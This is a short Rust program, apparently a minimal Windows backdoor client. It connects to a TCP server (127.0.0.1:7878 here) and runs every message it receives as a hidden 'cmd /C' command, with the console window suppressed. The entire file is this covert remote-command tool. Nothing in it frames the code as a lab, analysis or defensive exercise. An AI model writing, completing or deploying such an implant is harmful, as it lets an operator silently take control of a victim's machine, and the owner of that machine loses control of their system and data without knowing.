use std::io::prelude::*;
use std::process::Command;
use std::os::windows::process::CommandExt;
use std::net::TcpStream;

fn handle_command(mut stream: TcpStream) {
    let mut buf = [0; 1024];
    
    while let Ok(bytes) = stream.read(&mut buf[..]) {
        let command = std::str::from_utf8(&buf[..bytes]);

        match command {
            Ok(command) => {
                Command::new("cmd")
                    .args(["/C", command])
                    .creation_flags(0x08000000) 
                    .output()
                    .expect("failed to excute command");
            }
            Err(_) => println!("something went bad")
        }
    }
}

fn main() {
    let stream = TcpStream::connect("127.0.0.1:7878");
    
    match stream {
        Ok(stream) => {
            handle_command(stream);
        }, 
        Err(_) => println!("[ERROR] could not connect to server"),
    }
}
